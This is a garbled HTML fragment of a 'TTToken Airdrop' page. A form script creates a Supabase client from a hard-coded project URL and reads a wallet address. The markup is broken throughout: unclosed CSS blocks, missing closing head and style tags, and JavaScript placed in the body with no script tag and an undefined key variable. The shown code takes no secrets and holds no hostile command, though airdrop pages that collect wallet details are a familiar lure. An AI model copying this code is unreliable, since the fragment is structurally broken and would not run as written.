<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <style>
    body {

      align-items: center;
      padding: 30px;

    h1 {

      background: #1a1a1a;
      padding: 20px;
      border-radius: 15px;
      box-shadow: 0 0 10px #ff0000;
      display: flex;
      flex-direction: column;
      gap: 15px;
      width: 300px;

    input, button {

      border: none;

    input {
      background: #333;

<body>
  <h1>TTToken Airdrop</h1>

    const supabaseUrl = 'https://qwsgmmtmoynoazmhdlth.supabase.co';

    const supabase = supabase.createClient(supabaseUrl, supabaseKey);

    const form = document.getElementById('airdropForm');

      e.preventDefault();

      const wallet = document.getElementById('wallet').value;
